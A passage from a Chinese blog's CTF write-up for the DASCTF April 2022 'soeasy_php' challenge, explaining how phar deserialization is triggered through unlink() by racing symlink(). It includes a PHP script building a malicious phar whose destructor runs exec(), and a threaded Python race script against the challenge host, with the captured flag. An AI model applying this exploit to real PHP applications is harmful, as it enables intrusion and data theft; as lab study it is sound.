class="string">&#x27;png&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = fread(<span class="variable">$f</span>, filesize(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$contents</span>,<span class="string">&quot;flag&#123;&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            filewrite(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$flag</span> == <span class="string">&quot;Give me flag&quot;</span>) &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;Don&#x27;t give me flag&quot;</span>);</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filewrite(<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="variable">$flag</span>);  <span class="comment">//不给我看我自己写个flag。</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$head</span> = <span class="string">&quot;uploads/head.png&quot;</span>;</span><br><span class="line">        unlink(<span class="variable">$head</span>);</span><br><span class="line">        <span class="keyword">if</span> (symlink(<span class="variable">$filename</span>, <span class="variable">$head</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功更换头像&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;非正常文件，已被删除&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一眼反序列化，但是半天没看见函数<code>unserialize()</code><br />
+翻了翻笔记才想起来这玩意是phar反序列化<br />
+通过文件函数来触发反序列化<br />
+这里可以触发的有</p>
+<ul>
+<li><code>fopen()</code></li>
+<li><code>file_put_contents()</code></li>
+<li><code>unlink()</code></li>
+</ul>
+<p>首先参数<code>png</code>的正则绕不过去，后面两个函数<code>filewrite()</code>参数定死，函数<code>unlink($head)</code>参数定死<br />
+那就剩下最后一个函数<code>unlink($filename)</code>了<br />
+而执行函数<code>unlink($filename)</code>需要函数<code>symlink($filename, $head)</code><br />
+尝试给filename塞个数组进去，symlink确实寄了，但是unlink也寄了<br />
+想来想去还是只能竞争symlink了<br />
+只要我请求够快，就会有两个PHP线程在<code>unlink($head)</code>之后执行<code>symlink($filename, $head)</code><br />
+但是<code>symlink()</code>不能创建同名链接，所以慢的那个会False，然后运行<code>unlink($filename)</code>，即触发phar反序列化</p>
+<p>即使触发了phar反序列化，flag内容被写入到了<code>/tmp/flag.txt</code><br />
+要读取flag必定要<code>symlink(&quot;/tmp/flag.txt&quot;, &quot;uploads/head.png&quot;)</code>，然后访问head.png<br />
+但在此之前，会执行<code>filewrite(&quot;/tmp/flag.txt&quot;, &quot;Don't give me flag&quot;);</code>或<code>filewrite(&quot;/tmp/flag.txt&quot;, $flag);</code><br />
+也就是说<code>/tmp/flag.txt</code>会被覆写，所以需要再进行一次竞争</p>
+<p>但是从总体流程上来讲，这两次竞争完全可以放一起，以达到以下竞争效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">覆写错误flag -&gt;</span><br><span class="line">symlink链接phar文件 -&gt;</span><br><span class="line">symlink竞争触发unlink(phar) -&gt;</span><br><span class="line">覆写正确flag -&gt;</span><br><span class="line">symlink链接&#x2F;tmp&#x2F;flag.txt -&gt;</span><br><span class="line">读取正确flag</span><br></pre></td></tr></table></figure>
+<p>这个思路看起来有点天方夜谭，但是还是能竞争出来的<br />
+（这题做出来的时候总感觉自己是非预期解法）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#php.ini: phar.readonly = Off</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span class="string">&quot;/copyflag&quot;</span>); <span class="comment">//以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SFTQL&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;copyflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();<span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/uploads/head.png&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://270056b0-3eb6-4a8e-afc5-b70bdf3e8f4b.node4.buuoj.cn:81/edit.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;phar:///var/www/html/uploads/01908b979c3dea9fc658e68ab8c560e4.png&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">symlink</span>():</span></span><br><span class="line">    req.post(url2, data=&#123;<span class="string">&quot;png&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span>, <span class="string">&quot;flag&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=unlink, args=())</span><br><span class="line">        t2 = threading.Thread(target=symlink, args=())</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#getflag</span></span><br><span class="line">        flag = req.get(url1).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br><span class="line">flag&#123;eea59afa-414d-4045-8d7f-808abc804951&#125;</span><br></pre></td></tr></table></figure>
+<hr />
+<p>两个题做了五个小时，只能明天打游戏了</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2022/04/23/DASCTF-APR-2022/" title="DASCTF_APR_2022">https://yoloyolo.top/2022/04/23/DASCTF-APR-2022/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/Unserialize/" rel="tag"># Unserialize</a>
+              <a href="/tags/POP/" rel="tag"># POP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/06/MinDunCup-2021/" rel="prev" title="闽盾杯/黑盾杯 2021 WP">
+      <i class="fa fa-chevron-left"></i> 闽盾杯/黑盾杯 2021 WP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/14/Malware-HTTPS-Decryption/" rel="next" title="恶意程序HTTPS解密">
+      恶意程序HTTPS解密 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#warmup-php"><span class="nav-number">1.</span> <span class="nav-text"> warmup-php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#soeasy_php"><span class="nav-number">2.</span> <span class="nav-text"> soeasy_php</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">50</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
